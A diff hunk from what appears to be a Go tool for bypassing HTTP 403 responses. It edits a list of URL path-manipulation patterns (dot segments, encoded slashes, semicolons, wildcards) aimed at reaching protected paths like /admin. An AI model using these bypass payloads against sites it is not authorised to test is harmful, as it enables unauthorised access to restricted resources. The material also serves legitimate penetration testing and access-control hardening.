@@ -46,25 +46,25 @@ var BypassHeaders = []map[string][]string{
 }
 
 var PathBypassPatterns = []string{
-	"%s/./%s",      // https://example.com/./admin
-	"%s/../%s",     // https://example.com/../admin
-	"%s/%%2e/%s",   // https://example.com/%2e/admin
-	"%s/%s/",       // https://example.com/admin/
-	"%s/%s%%20/",   // https://example.com/admin%20/
-	"%s/;/%s",      // https://example.com/;/admin
-	"%s/.;/%s",     // https://example.com/.;/admin
-	"%s//;//%s",    // https://example.com//;//admin
-	"%s//%s//",     // https://example.com//admin//
-	"%s/%s.json",   // https://example.com/admin.json
-	"%s/./%s/..",   // https://example.com/./admin/..
-	"%s/*%s",       // https://example.com/*admin/
-	"%s/%s*",       // https://example.com/admin/*
-	"%s/%%2f%s",    // https://example.com/%2fadmin/
-	"%s%%2f%s%%2f", // https://example.com%2fadmin%2f
-	"%s//%s/./",    // https://example.com//admin/./
-	"%s///%s///",   // https://example.com///admin///
-	"%s/%s/;/",     // https://example.com/;/admin/
-	"%s//;//%s",    // https://example.com//;//admin/
+	"%s/./%s",       // https://example.com/./admin
+	"%s/../%s",      // https://example.com/../admin
+	"%s/%%2e/%s",    // https://example.com/%2e/admin
+	"%s/%s/",        // https://example.com/admin/
+	"%s/%s%%20/",    // https://example.com/admin%20/
+	"%s/;/%s",       // https://example.com/;/admin
+	"%s/.;/%s",      // https://example.com/.;/admin
+	"%s//;//%s",     // https://example.com//;//admin
+	"%s//%s//",      // https://example.com//admin//
+	"%s/%s.json",    // https://example.com/admin.json
+	"%s/./%s/..",    // https://example.com/./admin/..
+	"%s/*%s",        // https://example.com/*admin/
+	"%s/%s*",        // https://example.com/admin/*
+	"%s/%%2f%s",     // https://example.com/%2fadmin/
+	"%s/%%2f%s%%2f", // https://example.com%2fadmin%2f
+	"%s//%s/./",     // https://example.com//admin/./
+	"%s///%s///",    // https://example.com///admin///
+	"%s/%s/;/",      // https://example.com/;/admin/
+	"%s//;//%s",     // https://example.com//;//admin/
 }
 
 var HttpMethods = [9]string{
